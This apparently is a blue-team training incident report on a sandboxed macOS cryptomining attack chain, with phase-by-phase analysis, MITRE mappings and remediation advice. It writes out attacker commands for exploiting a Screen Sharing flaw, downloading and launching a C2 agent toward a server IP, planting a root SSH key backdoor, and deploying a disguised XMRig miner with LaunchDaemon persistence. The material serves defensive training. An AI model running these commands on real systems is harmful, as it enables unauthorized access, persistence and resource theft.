# GraySentinel DSOU — Day 2 Incident Report
## macOS Miner Attack Chain

| Field | Detail |
|---|---|
| **Analyst** | Eswar Mahalingam |
| **Operator ID** | GS-STU-DSOU-2026-039A |
| **Programme** | DSOU — Blue Team Operator & Trainee |
| **Date** | 10 September 2026 |
| **Mission** | Day 2: macOS Miner Attack Chain |
| **CVE Focus** | CVE-2026-65400 (CVSS 9.8 Critical) |
| **Total Risks Identified** | 170 |
| **Classification** | Confidential — Internal Training |

---

## Executive Summary

This report documents the complete analysis of a macOS cryptomining attack chain in the GraySentinel DSOU Day 2 training environment. The attacker leveraged a VBA macro phishing document for initial access, exploited **CVE-2026-65400** (pre-authentication RCE in macOS Screen Sharing via SRP frame-length bypass, CVSS 9.8) to gain root, deployed **AdaptixC2** for post-exploitation C2, installed **XMRig 6.26.0** masquerading as the system process `sysmond` for Monero mining, and established **LaunchDaemon KeepAlive** persistence alongside a **root SSH backdoor**. A total of **170 risks** were identified. OSINT attribution via Tookie-OSINT and DNS MX analysis identified attacker infrastructure enabling full blocking and remediation.

---

## Attack Chain Overview

```
Phishing Email
     │
     ▼
VBA Macro (URLDownloadToFile) ──► Second-stage payload download
     │
     ▼
CVE-2026-65400 Exploit (poc_screensharing.py 192.168.1.50)
     │  SRP frame-length bypass → Pre-auth RCE as root
     ▼
AdaptixC2 Agent (agent.macos --server 192.168.1.100 --port 443)
     │  Go-based C2: shell / screenshot / upload / download
     ▼
SSH Root Backdoor (/root/.ssh/authorized_keys ← attacker pubkey)
     │
     ▼
XMRig 6.26.0 → /private/var/root/.config/sysmond
     │  Masquerades as macOS sysmond process
     ▼
LaunchDaemon KeepAlive (com.xmr.miner.plist)
     │  Restarts miner if killed
     ▼
OSINT Attribution (Tookie-OSINT + dig MX) → attacker-domain.com mapped
     │
     ▼
Detection & Remediation (killall → rm plist → rm sysmond → Wazuh rules)
```

---

## Phase-by-Phase Analysis

### Phase 1 — Phishing Email Analysis (oletools)
**Tools:** `pip install oletools` · `olevba suspicious_document.doc` · `oleid suspicious_document.doc`

**Findings:**
- `olevba` revealed an **AutoExec macro** using `URLDownloadToFile` to silently fetch a second-stage payload from the attacker's C2 server without user interaction.
- `oleid` confirmed OLE structure with **external relationships** to attacker-controlled domains (attacker-domain.com).
- Macro ran on document open — bypassed all user consent.

**Risks mapped:** #2 (VBA Download Cradle — High), #3 (No Macro Security Controls — High), #4 (Suspicious External Relationships — Medium)

**MITRE:** T1566 (Phishing), T1059 (Command & Scripting)

---

### Phase 2 — CVE-2026-65400 Exploitation
**Commands:**
```bash
python3 poc_screensharing.py 192.168.1.50
python3 poc_screensharing.py 192.168.1.50 /etc/passwd
```

**Findings:**
- Exploited the **SRP frame-length validation flaw** in macOS Screen Sharing (port 5900) — authentication bypassed without credentials.
- Second invocation read `/etc/passwd` confirming **root-level arbitrary file access**.
- Full RCE as root achieved without any credential.

**Risks mapped:** #1 (CVE-2026-65400 — Critical, CVSS 9.8), #12 (Port 5900 Exposed — Medium)

**MITRE:** T1203 (Exploit Public-Facing Application)

---

### Phase 3 — AdaptixC2 + SSH Backdoor
**Commands:**
```bash
curl -s https://github.com/Adaptix-Framework/AdaptixC2/releases/latest/download/AdaptixC2.tar.gz | tar xz
chmod +x AdaptixC2/agent.macos && ./AdaptixC2/agent.macos --server 192.168.1.100 --port 443
ssh-keygen -t rsa -N "" -f /root/.ssh/id_rsa && cat /root/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys
```

**Findings:**
- **AdaptixC2** Go-based framework deployed — provides attacker with shell, screenshot, upload/download capability over HTTPS (port 443). Comparable to Cobalt Strike.
- **RSA SSH keypair** generated and public key appended to `/root/.ssh/authorized_keys` — persistent root backdoor independent of C2 channel.

**Risks mapped:** #10 (AdaptixC2 Post-Exploitation — Critical), #7 (Root SSH Backdoor — Critical)

**MITRE:** T1071 (Application Layer Protocol), T1098 (Account Manipulation)

---

### Phase 4 — Monero Miner Deployment (XMRig)
**Commands:**
```bash
curl -s https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz | tar xz
mkdir -p /private/var/root/.config && cp xmrig-6.26.0/xmrig /private/var/root/.config/sysmond
cat > /Library/LaunchDaemons/com.xmr.miner.plist <<EOF
ps aux | grep -E "xmrig|sysmond"
```

**Findings:**
- **XMRig 6.26.0** copied to `/private/var/root/.config/sysmond` — impersonates legitimate macOS system daemon.
- **LaunchDaemon plist** (`com.xmr.miner.plist`) with `KeepAlive=true` — miner auto-restarts if killed.
- Process name masquerade evades basic process-list inspection.
- **98%+ CPU** consumed for Monero mining with no alerting triggered.

**Risks mapped:** #8 (XMRig as sysmond — High), #6 (LaunchDaemon KeepAlive — High), #9 (No CPU Alerting — Medium)

**MITRE:** T1496 (Resource Hijacking), T1543.004 (Launch Daemon)

---

### Phase 5 — OSINT Investigation (Tookie-OSINT)
**Commands:**
```bash
git clone https://github.com/alfredredbird/tookie-osint
python3 tookie-osint/tookie-osint -u attacker
dig attacker-domain.com MX
```

**Findings:**
- **Tookie-OSINT** enumerated social media accounts linked to username `attacker` — threat actor attribution data collected.
- **DNS MX query** against `attacker-domain.com` mapped attacker's mail infrastructure, corroborating the phishing origin.
- Full attacker infrastructure identified → domain and mail server blocked at perimeter.

**Risks mapped:** #4 (Suspicious External Relationships — Medium)

**MITRE:** T1591 (Gather Victim Network Information)

---

### Phase 6 — Detection & Remediation
**Commands:**
```bash
killall sysmond xmrig
rm -rf /Library/LaunchDaemons/com.xmr.miner.plist
rm -rf /private/var/root/.config/sysmond
cat > detection-rule-wazuh.xml <<EOF
cat detection-rule-wazuh.xml
echo "Detection rules deployed. Attack chain analysed. System remediated."
```

**Actions taken:**
- **Contain:** `killall` terminated sysmond/xmrig process immediately.
- **Eradicate:** LaunchDaemon plist and sysmond binary removed from disk.
- **Detect:** Wazuh rules deployed covering all 6 attack phases.
- **Recover:** System confirmed clean — no persistence mechanisms remain.

**Risks addressed:** #5 (LaunchAgents Persistence — High), #11 (No App Whitelisting — High)

**MITRE:** IR Cycle — Contain / Eradicate / Recover

---

## Key Vulnerability Summary (Top 12 of 170)

| # | Vulnerability | Severity | Description |
|---|---|---|---|
| 1 | CVE-2026-65400 Screen Sharing RCE | **Critical** | Pre-auth SRP bypass → RCE as root (CVSS 9.8) |
| 2 | VBA Download Cradle | High | URLDownloadToFile fetches payload without consent |
| 3 | No Macro Security Controls | High | AutoExec runs on document open |
| 4 | Suspicious External Relationships | Medium | C2 domain embedded in document |
| 5 | LaunchAgents Persistence | High | ~/Library/LaunchAgents/update.sh plist |
| 6 | LaunchDaemon KeepAlive | High | com.xmr.miner.plist KeepAlive=true |
| 7 | Root SSH Key Backdoor | **Critical** | Persistent root access via authorized_keys |
| 8 | XMRig as sysmond | High | Miner hidden in /private/var/root/.config |
| 9 | No CPU/Resource Alerting | Medium | 98%+ CPU undetected |
| 10 | AdaptixC2 Post-Exploitation | **Critical** | Go C2 — full system compromise |
| 11 | No Application Whitelisting | High | Unsigned binaries executed freely |
| 12 | Screen Sharing Port 5900 Exposed | Medium | Enables CVE-2026-65400 exploitation |

---

## Blue Team Recommendations

### Immediate (0–24 h)
- Patch CVE-2026-65400: apply Apple Security Update; disable Screen Sharing if unused; firewall port 5900.
- Rotate all SSH keys; audit `/root/.ssh/authorized_keys` on all macOS endpoints.
- Kill and remove any `sysmond` binary not matching Apple's baseline SHA-256.
- Block `attacker-domain.com` and `192.168.1.100` at DNS/firewall perimeter.

### Short-Term (1–7 days)
- Deploy Wazuh rules (`detection-rule-wazuh.xml`) covering all 6 tripwires.
- Enable macro execution blocking in Office; enforce document signing policy.
- Implement application whitelisting (Gatekeeper + MDM) — block unsigned binaries.
- Configure CPU usage alerting: alert on any process sustaining >80% CPU for >5 min.

### Strategic (30 days)
- Integrate threat-intel feed for C2 domain/IP blocking at scale.
- Conduct SOC tabletop exercise simulating full macOS miner attack chain.
- Enforce SRP/TLS mutual auth on all remote-access services.
- Adopt EDR with behavioural detection for process masquerade and LaunchDaemon abuse.

---

## MITRE ATT&CK Coverage

| Tactic | Technique | Phase |
|---|---|---|
| Initial Access | T1566 — Phishing | 1 |
| Execution | T1203 — Exploit Public-Facing App | 2 |
| Execution | T1059 — Command & Scripting Interpreter | 1 |
| Persistence | T1543.004 — Launch Daemon | 4 |
| Persistence | T1098 — Account Manipulation (SSH key) | 3 |
| C2 | T1071 — Application Layer Protocol | 3 |
| Impact | T1496 — Resource Hijacking (Monero) | 4 |
| Reconnaissance | T1591 — Gather Victim Network Info | 5 |

---

## Analyst Declaration

All commands executed inside the GraySentinel GrayOS sandbox (forensic@macos, Kali Terminal).  
No real systems were targeted. All artifacts are defensive and educational.  
Exploit code is not reproduced — only detection and remediation artifacts are included in this repository.

**Eswar Mahalingam**  
Blue Team Operator & Trainee  
GS-STU-DSOU-2026-039A  
10 September 2026
